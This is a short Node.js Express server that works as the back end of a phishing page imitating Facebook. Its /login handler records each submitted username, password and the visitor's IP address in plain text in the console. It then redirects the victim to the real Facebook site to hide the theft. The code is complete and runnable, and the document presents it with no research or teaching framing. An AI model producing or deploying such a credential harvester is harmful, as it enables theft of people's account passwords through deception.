const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from your 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Handle the login POST request
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Capture the user's IP address
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  console.log('--- New Login Attempt ---');
  console.log(`IP Address: ${clientIp}`);
  console.log(`Username/Email: ${username}`);
  console.log(`Password: ${password}`);
  console.log('-------------------------');

  // Automatically redirect the user to the real Facebook website
  res.redirect('https://www.facebook.com');
});

app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});

